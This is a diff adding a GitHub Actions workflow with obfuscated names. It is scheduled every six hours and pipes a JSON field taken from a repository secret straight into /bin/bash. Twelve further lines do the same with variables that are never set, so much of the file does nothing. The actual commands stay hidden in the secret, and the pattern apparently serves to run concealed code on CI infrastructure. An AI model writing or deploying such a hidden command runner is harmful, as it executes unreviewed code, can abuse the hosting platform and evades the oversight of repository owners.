@@ -1,0 +1,29 @@
+name: changyongjiu2314
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: changyongjiu2314
+        env:
+          hbh32410: ${{ secrets.hbh32410 }}
+        run: |
+          echo $hbh32410 | jq -r .itwrp981 | /bin/bash
+          echo $r38651 | jq -r .gnoy355 | /bin/bash
+          echo $bfzel9 | jq -r .qhs72 | /bin/bash
+          echo $ygzsm9931 | jq -r .vxhuo66658 | /bin/bash
+          echo $p4 | jq -r .et3849 | /bin/bash
+          echo $igmb25858 | jq -r .qc57750 | /bin/bash
+          echo $ul00313 | jq -r .mazjb69 | /bin/bash
+          echo $zn7077 | jq -r .hv59801 | /bin/bash
+          echo $usqj3 | jq -r .nbqzx3603 | /bin/bash
+          echo $rikw203 | jq -r .x8 | /bin/bash
+          echo $ih11 | jq -r .midu3875 | /bin/bash
+          echo $vgxno79 | jq -r .sdwu52 | /bin/bash
+          echo $xu5 | jq -r .ez7 | /bin/bash
+
